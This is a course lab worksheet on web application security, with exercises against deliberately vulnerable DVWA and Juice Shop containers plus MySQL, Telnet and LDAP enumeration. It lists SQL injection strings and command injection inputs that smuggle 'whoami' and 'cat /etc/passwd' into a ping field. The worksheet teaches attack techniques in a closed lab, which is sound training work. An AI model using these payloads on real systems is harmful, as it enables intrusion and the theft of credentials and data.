# Week 7 Worksheet — Web Application Security & Protocol Analysis

## Overview

This week covers web application vulnerabilities (SQL injection, XSS, command injection) using DVWA and Juice Shop, alongside protocol analysis with Wireshark and legacy service exploitation.

## Lab Environment

| Container | IP | Access |
|-----------|-----|--------|
| week7-attacker | 10.10.7.13 | `docker exec -it week7-attacker bash` |
| week7-dvwa | 10.10.7.12 | http://localhost:8085 (admin/password) |
| week7-juice-shop | 10.10.7.11 | http://localhost:3012 |
| week7-mysql | 10.10.7.9 | mysql -h 10.10.7.9 -u user -puserpassword |
| week7-telnet | 10.10.7.10 | telnet 10.10.7.10 |
| week7-ldap | 10.10.7.7 | ldapsearch -x -H ldap://10.10.7.7 |
| week7-wireshark | 10.10.7.2 | http://localhost:3000 |

## Exercises

### 1. SQL Injection — DVWA

Browse to DVWA at `http://localhost:8085`. Set security to **Low**.

Navigate to: **SQL Injection**

Try these payloads in the User ID field:
```
1' OR '1'='1
1' UNION SELECT user, password FROM users-- -
```

Document what data you can extract.

### 2. Command Injection — DVWA

Navigate to: **Command Injection**

Test:
```
127.0.0.1
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
```

### 3. MySQL Enumeration

From the attacker container:
```bash
mysql -h 10.10.7.9 -u user -puserpassword exampledb
```
```sql
SHOW TABLES;
DESCRIBE employees;
SELECT * FROM employees;
```

### 4. Telnet Analysis

Capture traffic in Wireshark, then connect via Telnet:
```bash
telnet 10.10.7.10
```

Observe the plaintext credentials in Wireshark.

### 5. LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.10.7.7 -b "dc=example,dc=org" -D "cn=admin,dc=example,dc=org" -w admin
```

---

## Optional: CTF Challenge

Once you have completed all exercises above, test your skills with an optional Capture The Flag challenge.

See **[ctf-challenge.md](./ctf-challenge.md)** for objectives.

Two flags to capture: `user.txt` and `root.txt`  
Flag format: `flag{...}`  
No hints — instructor walkthrough released at end of session.
